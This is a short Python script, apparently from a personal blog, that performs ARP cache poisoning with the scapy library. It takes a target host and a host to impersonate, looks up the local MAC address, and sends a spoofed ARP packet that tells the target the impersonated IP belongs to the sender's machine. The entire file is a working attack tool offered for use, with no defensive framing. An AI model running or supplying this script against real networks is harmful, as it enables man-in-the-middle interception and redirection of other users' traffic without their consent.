#!/usr/bin/python
 
# Python arp poison example script
# Written by aviran
# visit for more details aviran.org
 
from scapy.all import *
import sys
 
def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
Timeout=2
 
if len(sys.argv) != 3:
    print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
    sys.exit(1)
 
     
my_mac = get_mac_address()
if not my_mac:
    print "Cant get local mac address, quitting"
    sys.exit(1)
 
packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])
 
sendp(packet)
